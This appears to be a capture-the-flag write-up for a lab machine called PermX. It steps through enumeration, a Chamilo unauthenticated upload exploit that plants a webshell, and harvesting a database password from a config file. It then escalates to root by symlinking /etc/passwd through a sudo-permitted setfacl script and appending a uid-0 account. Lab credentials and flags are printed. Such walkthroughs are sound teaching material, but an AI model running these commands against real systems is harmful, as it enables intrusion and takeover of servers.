@@ -1,0 +1,291 @@
+PermX: Vulnerabilities: Script exploitation, exposed configuration files, Chamilo CVE 
+
+ Enumeration:
+ sudo nmap -sC -sV -p- --min-rate=1000 10.129.156.32
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 e2:5c:5d:8c:47:3e:d8:72:f7:b4:80:03:49:86:6d:ef (ECDSA)
+|_  256 1f:41:02:8e:6b:17:18:9c:a0:ac:54:23:e9:71:30:17 (ED25519)
+80/tcp open  http    Apache httpd 2.4.52
+|_http-title: Did not follow redirect to http://permx.htb
+|_http-server-header: Apache/2.4.52 (Ubuntu)
+Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+http://permx.htb/ 
+
+echo 10.129.156.32 permx.htb | sudo tee -a /etc/hosts
+gobuster dir -u http://permx.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  
+
+Webpage has many HTML files like courses.html, 
+
+I can submit a form on contact.html? Page, and I get this in burp suite as a request:
+
+GET /maps/embed?pb=!1m18!1m12!1m3!1d3001156.4288297426!2d-78.01371936852176!3d42.72876761954724!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x4ccc4bf0f123a5a9%3A0xddcfc6c1de189567!2sNew%20York%2C%20USA!5e0!3m2!1sen!2sbd!4v1603794290143!5m2!1sen!2sbd HTTP/2
+Host: www.google.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: http://permx.htb/
+Dnt: 1
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: iframe
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: cross-site
+Sec-Gpc: 1
+Te: trailers
+
+
+
+
+
+Http response:
+HTTP/2 200 OK
+Expires: Fri, 01 Jan 1990 00:00:00 GMT
+Content-Security-Policy: object-src 'none';base-uri 'self';script-src 'nonce-_Pc1xH6VPUDv8ZGbGtX1oA' 'strict-dynamic' 'report-sample' 'unsafe-eval' 'unsafe-inline' https: http:;report-uri https://csp.withgoogle.com/csp/geo-maps-api/1
+X-Robots-Tag: noindex,nofollow
+Pragma: no-cache
+Cache-Control: no-cache, must-revalidate
+Content-Type: text/html; charset=UTF-8
+Vary: Origin
+Vary: X-Origin
+Vary: Referer
+Date: Wed, 24 Jul 2024 17:50:36 GMT
+Server: scaffolding on HTTPServer2
+Content-Length: 2244
+X-Xss-Protection: 0
+X-Content-Type-Options: nosniff
+Alt-Svc: h3=":443"; ma=2592000,h3-29=":443"; ma=2592000
+
+<!DOCTYPE html>
+<html>
+  <head>
+    <style type="text/css">
+      html, body, #mapDiv {
+        height: 100%;
+        margin: 0;
+        padding: 0;
+      }
+    </style>
+  </head>
+  <body>
+    <div id="mapDiv"></div>
+      
+    <script nonce="_Pc1xH6VPUDv8ZGbGtX1oA">
+      function onEmbedLoad() {
+        initEmbed([null,null,null,null,null,[[[2,"spotlit",null,null,null,null,null,[null,null,null,null,null,null,null,null,null,null,11,null,[null,null,null,null,null,null,null,null,null,null,null,null,null,1]]]],null,null,[[null,null,null,null,null,null,null,null,null,null,null,null,null,[[["5533881540341376425","15983212138518320487"],"/m/059rby",null,[432994285,3552787970],null,null,null,1,null,null,null,[[404765780,3497341395],[450158610,3577192386]],null,null,"gcid:us_state"],0,1,null,null,0,null,0]]]],null,["en","bd"],[null,null,null,"/maps/api/js/ApplicationService.GetEntityDetails","/maps/embed/upgrade204",null,"/maps/embed/record204"],null,null,null,null,null,null,null,null,"7D6hZrC7J7Xl5NoP39O62AE",null,null,null,[[[3001156.428829743,-75.77004055,42.7462195],[0,0,0],null,13.10000038146973],null,0,[["0x4ccc4bf0f123a5a9:0xddcfc6c1de189567","New York, USA",[43.2994285,-74.2179326]],"New York",["United States"],null,null,null,null,null,null,null,null,["http://www.ny.gov/","ny.gov",null,"0ahUKEwiw4ZnTnsCHAxW1MlkFHd-pDhsQ61gICSgG"],null,"United States",null,null,null,null,null,null,null,null,null,1,1,null,null,"ChIJqaUj8fBLzEwRZ5UY3sHGz90",null,null,"0ahUKEwiw4ZnTnsCHAxW1MlkFHd-pDhsQ8BcIAigA"]],null,null,null,0,null,null,null,null,null,null,[1]]);
+      }
+      function onApiLoad() {
+        var embed = document.createElement('script');
+        embed.src = "https://maps.gstatic.com/maps-api-v3/embed/js/57/9/init_embed.js";
+        document.body.appendChild(embed);
+      }
+    </script>
+    <link rel="preload" href="https://maps.gstatic.com/maps-api-v3/embed/js/57/9/init_embed.js" nonce="_Pc1xH6VPUDv8ZGbGtX1oA" as="script" />
+    <script src="https://maps.googleapis.com/maps/api/js?client=google-maps-embed&amp;paint_origin=&amp;libraries=geometry,search&amp;v=weekly&amp;loading=async&amp;language=en&amp;region=bd&amp;callback=onApiLoad" nonce="_Pc1xH6VPUDv8ZGbGtX1oA" async defer></script>
+  </body>
+</html>
+
+http://permx.htb/lib/ we also found this from gobuster
+
+/img                  (Status: 301) [Size: 304] [--> http://permx.htb/img/]
+/css                  (Status: 301) [Size: 304] [--> http://permx.htb/css/]
+/lib                  (Status: 301) [Size: 304] [--> http://permx.htb/lib/]
+/js                   (Status: 301) [Size: 303] [--> http://permx.htb/js/]
+/server-status        (Status: 403) [Size: 274]
+
+Index of /lib
+[ICO]	Name	Last modified	Size	Description
+[PARENTDIR]	Parent Directory	 	- 	 
+[DIR]	animate/	2024-01-20 14:59 	- 	 
+[DIR]	easing/	2024-01-20 14:59 	- 	 
+[DIR]	owlcarousel/	2024-01-20 14:59 	- 	 
+[DIR]	waypoints/	2024-01-20 14:59 	- 	 
+[DIR]	wow/	2024-01-20 14:59 	- 	 
+
+
+We see a variety of services the webserver uses.
+
+WOW wow.js - v1.3.0 - 2016-10-04 
+Waypoints - 4.0.1 
+ * Owl Carousel v2.2.
+jQuery Easing v1.4.1
+
+animate.css -http://daneden.me/animate
+ * Version - 3.5.2
+
+Apache/2.4.52 
+
+
+gobuster vhost -w /opt/useful/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://permx.htb/ --append-domain -t 50 -o gobuster_output.txt
+
+ 
+└──╼ [★]$ grep -v "Status: 302" gobuster_output.txt
+Found: lms.permx.htb Status: 200 [Size: 19347]
+
+echo 10.129.156.32 lms.permx.htb | sudo tee -a /etc/hosts
+
+This took me to a login page
+http://lms.permx.htb/index.php?loginFailed=1&error=user_password_incorrect   
+
+POST /index.php HTTP/1.1
+Host: lms.permx.htb
+User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: http://lms.permx.htb/index.php?loginFailed=1&error=user_password_incorrect
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 65
+Origin: http://lms.permx.htb
+DNT: 1
+Connection: close
+Cookie: ch_sid=e62k7rbc2e8nhgj004ss9hsadr
+Upgrade-Insecure-Requests: 1
+Sec-GPC: 1
+
+login=admin&password=DigitalOceanpass&submitAuth=&_qf__formLogin=
+
+
+[msf](Jobs:0 Agents:0) exploit(unix/webapp/jquery_file_upload) >> search chamilo 
+Matching Modules
+================
+
+   #  Name                                                  Disclosure Date  Rank       Check  Description
+   -  ----                                                  ---------------  ----       -----  -----------
+   0  exploit/linux/http/chamilo_unauth_rce_cve_2023_34960  2023-06-01       excellent  Yes    Chamilo unauthenticated command injection in PowerPoint upload
+
+Let’s try another way
+
+linux/http/chamilo_unauth_rce_cve_2023_34960) >> curl -I http://lms.permx.htb
+[*] exec: curl -I http://lms.permx.htb
+
+HTTP/1.1 200 OK
+Date: Tue, 23 Jul 2024 18:40:06 GMT
+Server: Apache/2.4.52 (Ubuntu)
+Set-Cookie: ch_sid=os09th6sa7rvc27tjh8t9mnr0f; path=/; HttpOnly
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+X-Powered-By: Chamilo 1
+Set-Cookie: GotoCourse=deleted; expires=Thu, 01-Jan-1970 00:00:01 GMT; Max-Age=0; HttpOnly
+Content-Type: text/html; charset=UTF-8
+
+https://github.com/m3m0o/chamilo-lms-unauthenticated-big-upload-rce-poc 
+
+
+[+] Upload successfull [+]
+
+Webshell URL: http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/webshell.php?cmd=<command>
+
+www-data@permx:/var/www$ whoami
+whoami
+www-data
+
+ 
+This gave us the user shell we needed
+
+Privilege escalation:
+
+Let’s get LinPEAS in here
+
+╔══════════╣ Users with console
+mtz:x:1000:1000:mtz:/home/mtz:/bin/bash
+root:x:0:0:root:/root:/bin/bash
+
+══╣ Some home ssh config file was found
+/usr/share/openssh/sshd_config
+
+FTP_PASSWORD=gaufrette
+FTP_BASE_DIR=/gaufrette
+MONGO_URI=mongodb://mongodb:27017
+MONGO_DBNAME=gridfs_test
+SFTP_HOST=sftp
+SFTP_PORT=22
+SFTP_USER=gaufrette
+SFTP_PASSWORD=gaufrette
+SFTP_BASE_DIR=gaufrette
+
+www-data@permx:/var/www/chamilo/app/config$ grep -r "db_" .
+grep -r "db_" .
+./sonata/sonata_media.yml:    db_driver: doctrine_orm # | doctrine_mongodb
+./fos/fos_user.yml:    db_driver: orm # can be orm or odm
+./configuration.php:$_configuration['db_host'] = 'localhost';
+./configuration.php:$_configuration['db_port'] = '3306';
+./configuration.php:$_configuration['db_user'] = 'chamilo';
+./configuration.php:$_configuration['db_password'] = '03F6lY3uXAP2bkW8';
+./configuration.php:$_configuration['db_manager_enabled'] = false;
+./configuration.php://$_configuration['session_stored_in_db_as_backup'] = true;
+./configuration.php://$_configuration['sync_db_with_schema'] = false;
+
+www-data@permx:/var/www/chamilo/app/config$ mysql -u chamilo -P 3306 -h localhost -p chamilo
+<g$ mysql -u chamilo -P 3306 -h localhost -p chamilo
+Enter password: 03F6lY3uXAP2bkW8
+
+
+Found this in the users table within chamilo database - this should be hash of the admin password
+$2y$04$1Ddsofn9mOaa9cbPzk0m6euWcainR.ZT2ts96vRCKrN7CGCmmq4ra 
+
+└──╼ [★]$ hashid '$2y$04$1Ddsofn9mOaa9cbPzk0m6euWcainR.ZT2ts96vRCKrN7CGCmmq4ra'
+Analyzing '$2y$04$1Ddsofn9mOaa9cbPzk0m6euWcainR.ZT2ts96vRCKrN7CGCmmq4ra'
+[+] Blowfish(OpenBSD) 
+[+] Woltlab Burning Board 4.x 
+[+] bcrypt 
+
+Another way:
+ssh mtz@permx.htb using password “03F6lY3uXAP2bkW8”
+
+mtz@permx:~$ cat user.txt
+371c49dfbc32ab6975ade6f40f4bda17
+
+mtz@permx:~$ sudo -l
+Matching Defaults entries for mtz on permx:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
+    use_pty
+
+User mtz may run the following commands on permx:
+    (ALL : ALL) NOPASSWD: /opt/acl.sh
+
+mtz@permx:/opt$ cat acl.sh 
+#!/bin/bash
+
+if [ "$#" -ne 3 ]; then
+    /usr/bin/echo "Usage: $0 user perm file"
+    exit 1
+fi
+
+user="$1"
+perm="$2"
+target="$3"
+
+if [[ "$target" != /home/mtz/* || "$target" == *..* ]]; then
+    /usr/bin/echo "Access denied."
+    exit 1
+fi
+
+# Check if the path is a file
+if [ ! -f "$target" ]; then
+    /usr/bin/echo "Target must be a file."
+    exit 1
+fi
+
+/usr/bin/sudo /usr/bin/setfacl -m u:"$user":"$perm" "$target"
+
+Using the script above, create a file in home directory as a symbolic link to /etc/passwd then give us write/read permissions on there
+
+ln -s /etc/passwd /home/mtz/symlink_to_passwd
+Sudo /opt/acl.sh mtz rw /home/mtz/symlink_to_passwd
+echo "exploit_user:$1$root$0wvx02GHt2W9NxNmfp3Jw1:0:0:root:/root:/bin/bash" >> /etc/passwd
+In order to log in as exploit_user, we need to make a hash to put into this entry as well: (the one in red)
+openssl passwd -1 -salt root my_secure_password
+
+su exploit_user and login with “my_secure_password”
+
+
+
+Now we have root access
+root@permx:~# cat root.txt
+a5ab74e109a8c8539e366010ce72bc8c
